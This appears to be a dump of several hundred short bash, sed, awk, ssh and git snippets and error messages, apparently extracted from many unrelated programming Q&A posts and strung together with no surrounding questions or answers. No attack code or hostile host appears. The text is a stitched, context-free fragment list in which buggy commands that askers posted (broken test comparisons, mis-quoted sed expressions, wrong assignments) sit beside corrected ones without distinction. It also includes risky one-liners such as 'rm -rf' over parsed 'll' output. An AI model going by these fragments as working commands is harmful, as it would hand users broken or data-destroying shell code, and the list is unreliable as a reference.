Dec 25, 2014 09:30:00
cut -b
Brew Doctor
$HOME/work/A/trial1, trial2, trial3..
grep | tr | cut > file
' \n'
| tr -s ' '
"for each day of mont ..."
"while day < lastDay ...."
local IFS
java -jar myTopJar.jar
java -jar mySecondJar.jar & disown
if ! [[ -s "$the_file_to_check" ]] ; then echo "file is zero sized and not exist | is exist and zero sized | not zero sized and not exist | not zero sized or not exist | not exist (obviously zero sized)" ; fi
file is zero sized and not exist | is exist and zero sized | not exist (obviously zero sized)
exec /bin/bash << 'EOT'
source /home/deploy/.bashrc
(x, y)
(y, x)
shopt -s nullglob
( )
-g "hello world"
"hello world"
-g "hello world"
"hello world"
"hello world"
-bash: !": event not found
alias vm="ssh vagrant@127.0.0.1 -p 2222"
-bash: vm: command not found
sed: expression -e #1, character 14: option of s unknown
export "EDITOR=vim"
export EDITOR=vim
export EDITOR="/usr/bin/vim"
export QWANDRY_EDITOR=vim
syntax error near unexpected token
to process before your
help test
addit $1 $2
for HOST ..
ssh: cannot resolve hostname workshop2
for HOST in
man ssh
man bash
dfind test
find / -type d -name "*test*"
{b[$1]=b[$1] $2$3"  "}
for (i in b) print i,b[i]}
hello world
printf -v
sh -x script
brew install ngrok
grep -v
grep -v
Completed ($TIME_HERE)
Pinging google.com 4 times
Complete ($TIME_HERE)
COMMAND='ping google.com -c 4';EXECTIME=$({ TIMEFORMAT='%E';time $COMMAND >log; } 2>&1);echo $EXECTIME
man bash
help test
Done, without errors
file '/path/to/file1'
self.textbuffer = textview.get_buffer()
assoc .php=phpfile
assoc .phar=pharfile
ftype pharfile=php.exe %1 %*
echo php "%~dp0wp-cli.phar" %* > [name of file].cmd
IFS= echo -e "1 2 3\t4 5\t6"
>./prog < "input-1" "input_2" ... "input-3"
[ exp ]
[[ exp ]]
cl col 'Years at'
Years at
cl file 'Academic Data'
-name dsc456.jpg -name dsc457.jpg
xsel -b -o
./securityanalysis.sh: line 7: find: command not found
eval $RSYSLOGCLIENTS
test.sh|head -n5
head -n1
echo $x
t.sh|head -n 2
man 7 signal
nc -l 4001
process.env.PATH = something
service ssh stop 2> ssh.error
printf 'contents\ncontents\n' > file; more file > file
echo "scale = 3; $y" |bc -l
round ${FLOAT} ${PRECISION}
mvim -v
mvim -v
mvim -v
paste file1 file2 file2
paste -d" " file1 file2 file3
/bin/bash ./mysql.sh
cd //
cd ///
out=$(snmpget -v2c -c $community $device ifDescr.2)
if [[ "$out" == *"Error"* ]]
'file_ABC01.mat', 'file_02.mat' > 'file_ABC02.mat',...
ls $dir | wc -w
find $dir -link 2
rm -rf
man bash
set -o nonomatch
rm -rf dir/*
rm -fr dir/*
too many arguments
if statements
php -a --file='ABSOLUTE_PATH_TO_FILE'
mutt -a pic1.png -a pic2.png -a pic3.png
shopt -s nullglob
./gradlew install
start testserver
exec "$JAVACMD" "${JVM_OPTS[@]}" -classpath "$CLASSPATH" mypackage.TestServer"$@"
expect fork
(( ... ))
(( ... ))
sudo gclient config ...
SLEEPING [<PID>] <counter>/<max_counter>
kill -0 <PID>
-v x=2 -v y=3
0==NR%2 {$0=substr($0,x+1,length($0)-y-x)}
0 == NR%2
if statement
cd /applications/{name of file}
"not pangram"
for i in {a..z}
ip addr | grep ether -B1
<interface> <hwaddr>
inter=$2; next
print inter,$2
/^[0-9]+: +/
{print var,$2}
oldprog >&2
cli_tool -f
"Enter preferred filename:"
read -r
pgrep -x
Solaris 10
sudo -u user /path/to/script.sh
su -s /bin/bash -c /path/to/script.sh user
exec('sudo -u user /path/to/script.sh');
for x in *.seg; do sed -i 1d ${x}; done
FNR > 1
NR == FNR
start / wait / kill / waitMore
Segmentation fault: 11
man signal
trap <expression> CHLD
trap 'if [[ $? -eq 139 ]]; then echo "SIGSEGV IN CHILD PROCESS, EXITING"; exit 139; fi' CHLD
[[ $? -eq 0 ]] && return
regular file
[ -f "$1" ]
[ -f $1 ]
wc -l
grep -c
/sbin/ifconfig tun0|grep -ci 'UP'
set -u
hexdump -vC
sh --version
| sed ...
hexdump -vC <"$SENT"
hexdump -vC <"$RCVD"
#define NON_INTERACTIVE_LOGIN_SHELLS
nettop > output.txt
nettop | tee output.txt
nettop -L 1
add-apt-repository ppa:ondrej/php5-5.6
apt-get install
apt-get -y install
add-apt-repository -y
set $line
read line
firefox -preferences
grep -R look $i
for i
in WORDS
for i in one two three
foo.sh file1 file2
ssh myUserName@pluto
$ sudo STAGE=production $DIR/transporter_pulldown.py
exec 6<>
help exec
([a-zA-Z]+ ([a-zA-Z0-9_]+)\(\)[[:space:]]+{[^}]+)printf("\2.+
cat -
NF>1{x=1+length($1); b=x; for (i=2;i<NF;i++){x+=length(FS $i); b=b " " x}; print b,id}
&& run-my-app.sh
export MY_VARIABLE="some-value"
screen -r
screen -x
[[ ${!2+_} && ${!1} == ${!2} ]] || return 1
isSubset a b
a='([0]="0" [1]="1" [2]="2" [3]="3" [4]="4" [5]="5")'
b='([0]="0" [1]="1" [2]="2" [3]="3" [4]="4" [5]="5" [6]="6" [7]="7" [8]="8" [9]="9" [10]="10")'
@=(a b)
set --
@=('a[key]' 'b[key]')
set --
set -u
${a[key]} == ${b[key]}
g.t..f o
g t f o
-v "sum=$sum" -v lower=N -v upper=N
runsum += $2; cdf=runsum/sum;
printf "%10.4f %10.4f %10.4f %10.4f",$1,$2,$2/sum,cdf; print ""
lower=="N" && cdf>0.025{lower=$1}
upper=="N" && cdf>0.975 {upper=$1}
END{printf "lower=%s upper=%s\n",lower,upper}
subprocess.call("sudo bash /home/pi/Desktop/switchtest.sh", shell=True)
sudo python /home/pi/Desktop/switch1.py
man sed
chmod 700 x.awk
if [ ${#REPORTS_PATH[@]} -gt 0 ]
info sort
ssh -vT git@github.com
eval "$(ssh-agent -s)"
ssh-add -l
ssh-add -l
ssh-keygen -t rsa
ssh-add /path/to/my-non-standard-ssh-folder/id_rsa
git remote -v
git push origin master
Permission denied (publickey). fatal: Could not read from remote repository.
ssh-keygen -t rsa
ssh-add /Users/federico/.ssh/id_rsa
Identity added: /Users/myname/.ssh/id_rsa (/Users/myname/.ssh/id_rsa)
ssh-add -l
ls -al ~/.ssh
ssh-add -K <key>
ssh-add ~/.ssh/PATH_TO_YOUR_SSH_PRIVATE_KEY (e.g. ~/.ssh/id_rsa)
ls command
git pull
ssh-add ~/.ssh/id_rsa
ssh-add /path/to/my-ssh-folder/id_rsa
info socat
socat -v -x - TCP:echo.websocket.org:80,crnl
Hello World Good Morning
[^ ]*
not space characters
xmlstarlet sel
$( compgen -W "$use" -- $cur )
( $(compgen ... ) )
(roger waters richard wright)
( "$(compgen ...)")
($'roger waters\nrichard wright')
help mapfile
compgen -W
roger waters
roger waters
roger\ waters
complete -F
-o filenames
printf '%q'
../data 1/01_text.tgz
No such file or directory
cd $DIR
cd ../data 1/01_text.tgz
cd "$DIR"
$ grep -Ff wordlist puzzle
$ rev puzzle |  grep -Ff wordlist puzzle
grep -f
grep -f
grep -of
shopt -s autocd
printf %q
printf '%s\0'
xargs -0
-d '\n'
find ... -print0
sort -z
xargs -0 cat
-j 4
cat file1 file2 | echo ${#(cat)/@path_to_file/'path//to//file'} | ... | ... | ... | ...
bad substitution
r"%s" % arg
date -d
- 3 minutes
chmod +a
chmod -R +a stuff x; chmod -R +a stuff y
chmod -R +a stuff x y
${f/ /}
${f// /}
mv prefix_* output_file_name
sed 'H;$!d;x;:a;s/word/MATCH/1;s/word/IGNORE/1;s/word/MATCH/1;t a;s/MATCH/words/g;s/IGNORE/word/g' file
wc -l
man path_helper
vim -s check-command-t.vim
paste -d\\n
xargs -d\\n -n2
xargs -E ""
sed -i
read -r
CREATE DATABASE
ssh david@machineA
app /build /build.sh
app --build --build.sh
GIT Bash Here
'ls_result': '(ls)'
enter code here
fold -w1
awk '/[<>]/{printf $2}'
-F"[ :]"
for i in *.conf; do basename $i .conf; sed -i "s/foo/${i}/" $i; done
do basename $i .conf
do basename $i .conf;
do j=$(basename $i .conf)
sed -i "s/foo/${j}/" $i
<generalSideMenu />
find . -name
find -name
END: HEADER
BEGIN: OPERATING SYSTEM
sh: root: command not found
crontab -e
* * * * 1-5 root /home/xxxxxx/jmeter/VerificationService-0.0.1-SNAPSHOT/jmeter-cron-randomise.sh >> /home/xxxxxxx/jmeter/VerificationService-0.0.1-SNAPSHOT/cron.log
* * * * 1-5 /home/xxxxxx/jmeter/VerificationService-0.0.1-SNAPSHOT/jmeter-cron-randomise.sh >> /home/xxxxxxx/jmeter/VerificationService-0.0.1-SNAPSHOT/cron.log
kill -USR1
grep -r -l "^<table>$" /directory_to_search_through
column -t
mod 489
<command> | tee -a <filename>
<command> | tee --append <filename>
man bash
kill 0
trap "echo received sigterm" SIGTERM
kill -s SIGTERM 0
kill -s SIGTERM 0
{ ./traptest; echo >&2 exitcode $?; } | cat -n
sed s/[regex]//g
-n 100
| grep .
-maxdepth 1
transfer_zip=$(gzip $cut_suffix.$today.csv)
gzip -c
> your_file_name
| while read line do ... end
sed '...' filename
x=$(sed '...' filename)
killall wget
wget --background
date -d '...' '+%s'
sh: 1: Syntax error: "(" unexpected
As DateTime
bash -x /root/initial.sh
dos2unix   mytarget.sh
sh mytarget.sh
crontab -l
(( ))
ack --ignore-case 'foo'
if [ $DEBUG=="YES" ]; then
if [ $DEBUG == "YES" ]; then
[ -n word ]
getopts ":d:" opt
./yourscript -d value
getopts ":d" opt
./yourscript -d
cd <Tab>
type _cd
cd /ve<Tab>
lsof | grep '^Preview*pdf$' >> listpreview.txt
test -r
while : ; do
adb reboot
adb reboot
- 35)}
-v "n=$(tput cols)" -v "h=^$HOME"
length($0)<=n || NF==3 {print;next;}
NF>3{b=b"/../"; e=$NF; n-=length(b $NF); for (i=NF-1;i>3 && n>length(e)+1;i--) e=$i"/"e;}
{print b e;}
~/workspace | wc -c
export PATH="/Users/sam/bin/android-sdk-macosx/platform-tools/"
echo $PATH
for loop
[! @ # $ % ^ & * ( ) _ + ]
sed 's/pattern/replacement/g file.txt
sed '/{/b;/pattern/{s//replacement/;:a;n;ba}' file.txt
sed '/{/b;/pattern/{s//replacement/;:a;n;ba}' file.txt
gsub(/pattern/, "replacement")
service mongodb status
nc -z localhost 27017
-o vi
" "
" "
echo "$wlan"
sh test.sh
./docker my-running-container my-image
grep -r -n ".string_example" .
wc -l
wc -l
man find
sh deploy.sh beta
sh deploy.sh production
$(shell ...)
ulimit -n
print ... >>
value for
\( \)
-v "d=$domain"
-v web=zero -v net=zero -v office=zero
$1=="web"{web=$2} $1=="net" {net=$2} $1=="office"{office=$2}
END{printf "%s: %s,%s,%s\n",d,web,net,office}
exec /usr/bin/ssh-agent $SHELL
./converted/alt-j/2012\ an\ awesome\ wave/01\ Intro.flac
man bash
%'' case) or the longest matching pattern (the
ps -efT
0.48.4 r9939
inkscape --verbs-list
GNU Parallel
chmod +x process
GNU Parallel
print $0
ls -1
if [ ! -f $filename ] ; then
mv "$i" "Z$i"
echo "i=$i w=$w c=$c h=$h"
for c in $input
stat -c '%Y %n'
sort -n
cut -d ' ' -f2
header1 header2
sep = ""
sep = ","
throws java.lang.Exception
public static void main(String[] args) {
public static void main(String[] args) throws java.lang.Exception {
(public|static|private|protected)* (void|int|String|double|float)+\s([a-zA-Z]*)\s*\(.*\)\s*
sed s/FIND/REPLACE/g file
throws java.lang.Exception
grep -v
NUSERS='who | wc -l'
PS1='\u@\h-${NUSERS}:\w $'
watch NUSERS='who | wc -l' &>/dev/null &
while true; do NUSERS='who | wc -l' && sleep 2; done &
right syntax to use near ''
set id=1
brew install coreutils
ls -le@
ls: invalid option -- 'e'
ls -@
[[ ... ]]
echo $PATH
$ pub global activate stagehand
pub global activate stagehand
ack -i 'mystring' 'searchDir'
~/sourceDir/script.sh: line 30: ack: command not found
exec 11<$loopfile
exec 11<<&-
exec 11<&-
-u 11
while read file; do ... done <$loopfile
grep -oE
> ./NUMBERS.dat
lS -Q | grep \.pdf > ../lslog.log
exiftool -"*Count*"
exiftool -"*Count*" 'examplePDF(withparantheses).pdf'
exiftool -"*Count*" 'examplePDF(withparantheses).pdf' 'anotherExamplePDF.pdf'
print $2
PROGRAM.C xyz
source /tmp/conf.bash
>> output.txt
b fi
awk command
ARGV[1] == FILENAME &&
-e /^abc$/d
./is-drupal www.URL.com
docker logs -f db
docker-compose down --volumes
rm $filepath
exit $?
<tag(?: [^>]+)?>((?:(?!<\/?tag[ >]).)*)<\/tag>
grep -P
grep -P
chmod +x banana
substring extraction
<cite> </cite>
This is a sentence..txt
This is a sentence..txt2
source '../../bin/load_bin'
$(dirname "$0")
z myrouterhostname
echo test >&${out}
exec {out}>out
-v FS="|"
FNR==1 {next}
FNR==NR {a[$1]=$0; next}
($1 in a) {if (!b[$1]) print a[$1]; print; b[$1]++}
set -o history
set -o histexpand
set +H
script.sh file\ name
file name
convert = TRUE
csvtool --help
abc 245
"abc 245"
echo "$w"
set -x
set -x
set -x
set -x
source ~/.bashrc
sed -i '/<[Hh][Tt][Mm][Ll]/,/<\/[Hh][Tt][Mm][Ll]/!d' *.html
sed -i '/<html/,/<\/html/!d' *.html
grep -orI "id=\"[^\"]\+\"" . | sort | uniq -d
-F :
... f==$1 {$0=$2; print}
tar tf
tar tf
for f in "${arr[@]}"
source ~/.bashrc
read $cmd
read cmd
read cmd
PATTERN,NR,FIELD POSITION
$ ./util.sh create
$ ./util.sh list
$ ./util.sh find
$ ./util.sh list
$ ./util.sh delete <<designdoc_name>>/json/subject-index
shopt -s nullglob
echo $CP
grep -P
sig hangup
read -p
User:python_script user$ ./python_script.py -n some_parameter -b
if [ $? = 0 ]; then
for f in *.txt
sed -i "s/$/ $ltr/" "$f"
s/$/ $ltr/
sed -e 's/K/\*1024/g' -e 's/M/\*1048576/g' -e 's/G/\*1073741824/g' | bc
numfmt --from=iec
echo "$str" | grep -v "^[a-zA-Z0-9 ]*$"
cat strFile | grep -v "^[a-zA-Z0-9 ]*$"
$str =~ '[!...+]'
echo foo > /dev/stdout
echo foo 1>&1
find -mtime -30
-iname "*"
gnu sed
gnu sed
sort -k 1b,1
-1 1
-2 1
-t '|'
process && notify "success" || notify "failure"
command; myscript $?
&& notify "success" || notify "failure"
notify -s $?
command; myscript $?
myscript process
myscript -c $?
File3 = $File1 - $File2 | cat $File3
date +%s
date --date='@<newTime>'
man date
cut -f 2 input.tsv | sort | uniq > output_final.tsv
note that the file has 7000 rows
cut -f 2 input.tsv > output1.tsv
sort output1.tsv > output2.tsv
uniq output2.tsv > output_final.tsv
cut -f 2 input.tsv | sort | uniq > output_final.tsv
cut -f 2 input.tsv | sort >/dev/null
sort -u
cut -f 2
ps -A
pgrep -x somecmdname
{print $0}
end of line
man djpeg
man djpeg > textfile.txt
ctrl-V ctrl-H
grep -E
echo "$myarray
1s/^/declare my2d=(\n/;
declare my2d=(
: 'whoami'
Invalid content of \{\}
cat test.txt | ...
substr(str, pos, len)
command.py -f CA01_S1_R1.fastq -r CA01_S1_R2.fastq -o paired.out
command.py -f CA02_S2_R1.fastq -r CA02_S2_R2.fastq -o paired.out
command.py -f CA03_S3_R1.fastq -r CA03_S3_R2.fastq -o paired.out
ls --color
which ls
squarishlooking char
-s "$current_line"
-O "$current_line"
r someotherfile
recipe_url=$(cat ./*.json | jq -r --arg v "$recipe_key" ".[\"\\($v)\"]")
dig +short example.com | head -n1 | xargs whois
else if
git ls-files
line 13: outbound.queue: syntax error: invalid arithmetic operator (error token is ".queue")
for i in "${!QUEUE[@]}"; do
declare -A
Oct2614 status:ok 0.86.50.86
Oct2614 status:ok 0.111.122.11
grep 'Oct2614' | uniq
uniq -w
grep -m
buy more beans
 command.sh 
<div class="pet_a">cat</div><div class="peg_b">dog</div>
<div class="pet_a">fish</div><div class="peg_b">whale</div>
echo $(var_c)
echo "$(functionname)"
1 2 3 4
hello world 1 2 3 4
boot2docker ssh
a[$3] = $3" "$5" "$6" "$2
if ( $3 in a ) a[$3] = a[$3]","$2
END{for (i in a) print a[i]}
npm install -g ember-cli
ember new <name>
echo $PATH
source ~/.bashrc
source ~/.zshrc
. name-of-the-script
function $1 $2 $3 | parallel --gnu --group --interactive -k -j 4 function_run {}
killall -9 php5
kill %1
kill %1
jobs -l
bower install
grep: 3: No such file or directory
grep: 5: No such file or directory
:g/^I/norm Jx
print ""
:norm 4J
:help :g
:help :norm
grep -v .old
grep -v '.old$'
grep -v
[[ "$file" == *.old ]]
if test "${p##*/}" = "$fname" ...
cat "$filename"
jobs -l
./script.sh > /dev/null 2>/dev/null &
jobs -l
kill %1
killall script.sh
'sudo reboot'
./run_chr 17
cmp - file
if ! ( commad)
exit 0
if ! (make $1); then
make $1
do ...
printf '%q'
cp -u
sort -R
sort -R
tr -d '\n'
sort -R
sort -R
printf "%s",$1
sort the original
read each line
compare the date/time to the previous
counter * 4min
write the new date/time to your output file.
offset while loop
offset while loop
time adjustment
date portion
time portion
new date field
date part
time part
4, 8, etc..
8 minutes
12, 16, 20, ...
3rd, 4th, 5th, ...
shell_exec('sudo ./command.sh $commandString')
{print $1}
unterminated address regex
echo Succeeds!
exit -1
exit -1
IF Statement
env | grep LOGNAME
which logname
which LOGNAME
echo $?
sed 's#^/to/be/removed/#/NewPathYouWantAsRoot/#' InputFile
sed 's#\(/[^/]*\)\{3\}/#/NewPathYouWantAsRoot/#' InputFile
exit 1
test $? -eq 0 || echo "something bad happened"
(( ... ))
set -e
#!/bin/bash -e
function && next
set -e
tr -d '[[:alpha:]] '
gsub(/ /, "", $5)
gsub (/%.*/,"",$5)
run_dir="Users/Me/My Directory\ With\ Spaces\ \(and parentheses\)/"
lspci | grep -i 'vga\|graphic' | cut -b 1-7 > text.txt
lspci | grep -i 'vga\|graphics'
read VAR1 VAR2 < <(sed -n '1p;$p' myfile | tr '\n' ' ')
/usr/bin/time: cannot run shared-func: No such file or directory
column -t -s $'\t'
sed -i '' [the regex] [the file]
sed -i ''
BSD sed
GNU sed
GNU sed
sed -i '' 'script' file
sed -i '' -e 'script' file
GNU sed
sed -i'' -e 'script' file
BSD sed
-e 'script'
BSD sed
GNU sed
-i ''
sed -i
$(echo 1)
printf "%3i ",total[j","i]
print ""
adb devices
< <(printf ...)
man grep
set -x
set -x
kill $(cat test.pid)
[-0-9 ]
/Applications/Postgres.app/Contents/Versions/9.3/bin'/psql -p5432
/Name/{name=$3; type=a[substr(name,length(name))]; if (length(type)==0) type="Prod";}
/SessionHost/{print type, name, $3;}
-type f
zsh 5.7.1
man 3 isspace
C2 A0
'\t '
column -t
ls -t | xargs
shopt -s extglob
\! -name $'*\n*'
chmod +x banana
function tesyn
for i in $(find . -name "*.mp3" -printf "%h\n"|sort -u); do echo "$i" ; done
$( ... )
$( ... )
-d ''
df -h
fork + exec
bash -c command
echo $?
beacon scan
beacon scan
read line
$d -eq "./r4.dev"
"$d" = ./r4.dev
"$(basename "${d}")" -eq "./r4.dev"
test -s
grep -v "EMPNUM"
cat, grep, cut
cat, grep, cut
while read var1 var2; do... done <"filename"
for i in $(cat file)
parameter expansion/substring extraction
substring extraction
cat, grep, cut
I am
i am
val1, val2, val3, ...
java -cp "a:b" className
echo ${arr[SOMETHING]}
myarray[key] = value
while ... do; ... done < <(command)
myarray[key] = value
while ... do; ... done < <(command)
df -k
tr -s' '
while [ $count -le 4 ]
[: -lt: unexpected operator
while [ "$count" -le 4 ]
df -k /var/tmp
tail -1
[: Illegal number:
bash --posix
set -o posix
bash --posix
set -o posix
[ -z $unquoted[variable ]
[ -z ]
[ '-z' ]
[ -n '-z' ]
[ "" -le 0 ]
[[ ... ]]
rm *copy*
rm -rf "*\(copy\)*.jpg"
-maxdepth 1
-type f
$(stat ...)
grep -o '\S*pin\S*' test.txt
-w "%{http_code}"
myfile.txt f
chmod +x
mdls filename.txt
sort -nr
blah 1
wc -l
sh -c
find /my/path/to/ | grep Makefile
vim /my/path/to/Makefile
sh myscript.sh
bash script
Choose a number or apply filter: 497:
System > Preferences > Keyboard Shortcuts
Scientific linux 6.4
keyboard preferences
notify-send "hello"
keyboard shortcuts
python /home/user/Scripts/script.py
xfce4-terminal -x ralia.sh
ls -lrt
find . -maxdepth 1 -type f
-exec bash -c
stat -c '%Y' "$f"
date -d "@$ts" "+%b"
mkdir -p "$m"
[ \t\n]*
<tag1 prop="<tag2></tag2>"> ...
Error: Could not find or load main class liquibase.integration.commandline.Main
cygwint -wp <path>
which cygpath
WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED
grep -q
grep -q
condition { action }
grep -q -v
usmUserEntry localSnmpID
man test
files+=( "$input" )
C:/Program Files
cd c:/
cd Program Files
cd Program Files
cd Program
Program Files
grep -q
if list; then ...
word1a word1b
sudo bash -c
No such file or directory
-v "RS=$RS"
!/pattern/{print RS,$0}
print RS,$0
echo $string|rev
$(command substitution)
[[ ... ]]
sed -r 's/^print\s(.+$)/print\(\1\)/g' 1.12.py > 1.12a.py
sed -r 's/print\s(.+$)/print\(\1\)/g' $pyFiles > $newName
sed -r 's/^print\s(.+$)/print\(\1\)/g' $pyFiles > $newName
sed -i "s/\"${FOO}\"/bar/m" file.txt
awk '{print $0 > $1".txt"}' inputFile
pkill -x test
for i in
; do kill -9 $i; done
help [[
-bash: f2py: command not found
import numpy.f2py
seq $filenumber
touch myfile{1..$filenumber}
word1=Villa de Leyva
/^C1 /
($(NF?NF-2:"")==/Villa de Leyva/ && $NF==/Colombia/ ) || ($(NF?NF-1:"")==/Villa de Leyva/ && $NF==/Colombia/ )
Villa de Leyva
grep -l '^.*Villa de Leyva.*Colombia.*$' xx*
from .. import module1
bash /root/to/my/project/outer_module/inner_module/myscript.sh
No module named outer_module.inner_module
from .. import module1
python -m outer_module.inner_module.myscript
sed '$!N;s/^.*\(first.*\)\n\(second.*$\)/\1\2/;s/ //g'
sed 's/^.*\(first.*\)\n\(second.*$\)/\1\2/;s/ //g'
sed  's/^.\{35\}\(.\{9\}\).*/\1/' infile
C --> C
Tree number #
grep -Eo '(([a-zA-Z0-9] -- |[a-zA-Z0-9] ==)> [a-zA-Z0-9]|Changes)' infile
grep -o '. [-|=][-|=]> .' infile
sed -n '/[--|==]>/{s/.*\(. [=|-][-|=]> .\).*/\1/p}' infile
read -d' '
npm install -g express-generator
sudo npm install -g express-generator
[ $i -eq 7 ]
for i in {0..8} ; for j in {0..16}
(( ))
1 h
3 {x;G;s/\n/ /;p;}
s/\n/ /
gnu awk
read day
read day _
"$day "*
*" $day"
*" $day "*
GREP_OPTIONS=--exclude=*.ext --exclude=*.ext2
bc -l
bc -l
current_date= date +"%y%m%d"
echo $current_date
echo ${u#*|}
Input Field Separator (IFS)
echo $! > mycommand.pid
set -f
set -f
bash -v
grep -l
140001-0100/  140101-0200/  140201-0300/  140301-0400/ 140401-0500/  140501-0600/
sed "s/\./\?/g"
find /path/to/library -type d -iname "Marvels?Agents?Of?S?H?I?E?L?D"
sed -i -e 's%/*bash_var*/(.*)/*end_bash_var*//'"$ var foo = 0; /g" index.html
sed -n '/object-group network OBJECT-GROUP-DADDY/,/object-group network/{$d;p}' ASA_CONFIG.cfg
sed -n '/object-group network OBJECT-GROUP-DADDY/,/object-group network/p' ASA_CONFIG.cfg | sed '$d'
0 >= i >=5
print inspect.getsource(tarfile.TarFile.extractall)
man test
"bar baz"
${HOSTS_APACHE// /\\|}
[ -n STRING ]
|if ...; fi
date +"%Y%m%d_%H%M%S"
h something
h something
hh 'something'
hh an
"${@:2}" in the
calls and removing the
grep -P
<mtime> <filename><NUL>
sort -g -z
xargs -0
ls -t
man zshexpn
-mindepth 1
-maxdepth 1
rm -rf $(ll -t | tail -n +5 | awk '{ print $9}')
paste -d"," tmp1 tmp2
paste -d',' tmp1 tmp2
paste -d "," tmp1 tmp2
. run.sh
$(date +%Y%m%d)
date +%Y%m%d
sub(/^[^,]+/, val[a[1]], $2)
val[$1] = $2
man rename
printf 10 | program_name
sed -i 's/PLACEHOLDER_TEXT/$HEREDOC/g' > file.txt
[1] 2992
test -x examples.desktop
echo $?
echo $?
command not found
END{for(b in a)print b","a[b]","s[b];}
'BEGIN{FS="|"; OFS=","}
$1~EXSTAT && $12~S{sum[$11]+=$14; count[$11]++}
$1~EXSTAT && $12~S
END{for (i in sum) print i,count[i],sum[i]}'
git checkout -b alpha_1 alpha_2 alpha_3 && push all
~/A/bin/A -Dhttp.port=6565 -Dconfig.file=~/A/conf/application.conf
mv ~/A-1.0 ~/A
unzip -j A-1.0.zip 'A-1.0/*' -d /the/output/dir
{send "/home/casper/.password\r" exp continue}
tail -n 30
source /etc/profile
echo $BLAHBLAH_HOME
source /etc/profile
nblines=$(wc -l < file)
sleep 30
sleep 1
man bash
echo -n '.'
printf "%q"
ps | sed "/^\s\+3/"
sed: -e expression #1, char 8: missing command
ps | sed "/^\s+3/g"
grep -E
man grep
grep -E
nohup ./testscript &
./testscript < /dev/null > /dev/null &
./testscript &
return 0
\([^ ]\)
\n \1
source ~/ .profile
source ~/.profile
digit m
type -a time
sum a.txt 3 4
-v c="$cols"
split(c, cols, " ")
for (col in  cols) sum[col]+=$col
END{for (i in sum) print sum[i]}
source ~/.bashrc
initctl start xxx
find / -type f -size +2000c -exec file {} \; 2>/dev/null | awk -F':' '/: ASCII text/ {print $1}' | while read FILENAME; do LINES="$(wc -l)"; if [ $LINES > 10000 ]; then echo $FILENAME && echo $LINES; fi; done
if [ $LINES > 10000 ]
if [ $LINES -gt 10000 ]
for i in {1..16}; do
mv "cyclones_hrrr_$i" "cyclones_hrrr_$((i-1))"
", "
awk '{print $2}'
awk '{print $4}'
grep -E
for x in ...
if then
echo "Hello World!
printf("Hello World!")
grep -v
grep -v
grep "[a-z]*\([a-z]\)[a-z]*\$1[a-z]*"
grep -v
grep -E -i -e 'regexp_1' ...
grep -E -i -v -e 'regexp_1' ...
grep -E -i -v ...
head -n 3000 /usr/share/dict/words | tail -n 300 > ./300words
read -a
sentence=this is a sentence
man 5 proc
sort -k3
sed command
sudo port install gsl
int main{}
-o cli_exec
sayHi John
hi John
echo John | sayHi
hi John
use $1 if it has a non-empty value otherwise use ...
123  4567890
the value of -
couldn't resolve OAuth
NF==1{print $0}
> data.txt
curl -G -k --data "address=berlin&sensor=false" http://maps.googleapis.com/maps/api/geocode/json
python manage.py shell
man grep
man tac
echo clienthostname
echo $HOSTNAME
myfunc "$i" &  wait $!
myfunc "$i" &  wait
wait $PID
kill -0
$1 == last+1 {last=$1;next}
print first,last;first=$1;last=first
END{print first,last}
make c
make compile
if(nargs < 9)
sum a.txt 3 4
sum a.txt 3 4
awk: : 1unexpected character '.'
./sum a.txt 2 3 ... n
shift 1
$2 -> $1
BEGIN { N = split(A,a," "); }
{y = 0; for(i = 1; i <= N; i++) y += $(a[i]); print y; }
a[i] = ARGV[i] + 0
ARGV[i] + 0
delete ARGV[i]
sh col.sh integers 2 5 2 7
n*sum(matrix(i,j), i)
E.g. crlf="$(echo xy | tr xy '\r\n')"
-flag arg
cat mazeFile0.txt | ./maze_ppm 5 | convert - maze0.jpg
for fname in mazeFile*; do
base=${fname%.txt}; base=${base#mazeFile}
./maze_ppm 5 <"$fname" | convert - "maze${base}.jpg"
git ls-tree -r $(git branch | awk '{ print $2 }') --name-only
chmod +x git-list
git list
ls [0-9][0-9][0-9][0-9].* | awk -F. '
script.sh: line 3: [: too many arguments
for file in *.m4r; do
printf '<string>system:%s</string>\n' "$file"
echo "$varA"
echo "$varB"
echo "$varA,$varB"
php update
declare -l country
-mtime 0
hadoop fs -ls
hadoop fs -ls
Unable to load realm info from SCDynamicStore.
me_pushd_N78MKZ; remainder_code; me_popd_N78UN9;
source a_path
BASH_SOURCE[1]: unbound variable
#!/bin/bash\n a_few_to_zero_seemingly_unimportant_commands\n  me_pushd_N78MKZ #NEQKEU=\n
ulimit -Sv 500000
IFS= read -r input
read -r input
$input > file.tmp
sort file.tmp
wc -l file.tmp
rm file.tmp
cmd1 | cmd2
chmod a+x dummy
./script.sh home
no. of line _and_ filename
-i -re
grep -v "Icon\r"
echo $key$num
sbcl --eval '(write-line "Hello, World!")'
File (make sure to name it the same, this is recursive):
./a.out < 0.in
NR==1 {id=$1}
$1~/^fall/ {printf "\t<course id=\"%s\">\n",id}
sudo find . -name "test" -exec sh -c "ln -s /path/ /path/{}; chown user:user /path/{}; chmod 640 /path/{}" \;
battery | sed 's/%/%%/'
ls | wc -l
[[ -t 1 ]]
echo $(ls)
echo "$(ls)"
hello cruel
cat file
find -print0
xargs -0
man mapfile
man bash
./test.sh &
kill -SIGINT PID
nohup ./test.sh &
kill -SIGINT PID
kill -SIGINT PID
kill -TERM PID
type source
type type
match($0, regex)
defaults write com.apple.finder QuitMenuItem -bool yes
Video test
Video test-jSbQ40_9B.mp3
echo "motionb is 0"
ssh: Could not resolve hostname : Name or service not known
sudo ts_calibrate
kill -0
man bash
curl -I
hadoop fs -ls /path/to/dir1*
hadoop fs -ls
man find
python Admin.py
$ python Admin.py > file.txt
1>&2 > file.txt
man bash
-n 1
NF>1{split(line[FNR], a); $1=a[2]; $2=a[3]; print $0}
split(line[FNR], a);
$1=a[2]; $2=a[3];
print $0
kill -TERM
'url': 'http://fhdjhjd/fkdf',
source test.sh
Bash Manual
new line
du -h
file --mime-type
echo $app
echo 'bundle name is $bundle'
bundle name is
su root
su root
su -
man su
set -x
set +x
echo ${!array[*]}
0 7
declare -pf array[5]
tail -f | awk '{print $1}' > file
tail -f | awk '{print $1}'
tail -10 | awk '{print $1}' > file
tail -f | unbuffer awk '{print $1}' > file
tail -f | awk > file
tail -f
| "tee /var/log/file"
echo $(cat threads.log | grep -o [0-9]*)
1 1 1 1 1 1 1
cat | grep
Please answer yes or no.
curl -s
A to A, A to B
fold -w1
partprobe -d -s /dev/sdb
partprobe -ds /dev/sdb
